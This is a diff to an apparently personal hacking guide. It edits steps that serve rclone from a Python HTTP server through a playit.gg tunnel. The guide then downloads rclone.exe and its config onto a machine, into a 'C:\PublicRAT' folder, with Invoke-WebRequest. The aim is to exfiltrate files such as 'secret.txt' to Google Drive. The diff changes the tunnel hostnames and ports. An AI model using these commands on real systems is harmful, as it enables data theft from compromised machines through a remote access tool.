@@ -152,10 +152,10 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
 
 ### Full process using port forwarding
 
-* Start the playit.gg
+* Start the playit.gg both from homescreen and the playit-0.9.3-signed from **E:\Hacking\Tools\PlayIt.gg**
 * E.g., start the server from **E:\Hacking\rclone-v1.69.2-windows-amd64\rclone-payload** :
    ```bash
-   python -m http.server 24547
+   python -m http.server 1335
    ```
 * Then do the following:
   ```powershall
@@ -170,8 +170,8 @@ Your file (e.g., `secret.txt`) should now appear in the root of your Google Driv
   ```
 * If the **test.txt** successfully writes in that location, then do:
   ```powershell
-  Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
-  Invoke-WebRequest -Uri "http://established-colombia.gl.at.ply.gg:24547/rclone.exe" -OutFile "C:\PublicRAT\rclone.conf"
+  Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.exe" -OutFile "C:\PublicRAT\rclone.exe"
+  Invoke-WebRequest -Uri "http://silver-generate.gl.at.ply.gg:22366/rclone.conf" -OutFile "C:\PublicRAT\rclone.conf"
   ```
 * Then transfer data using the following convention:
   ```powershell
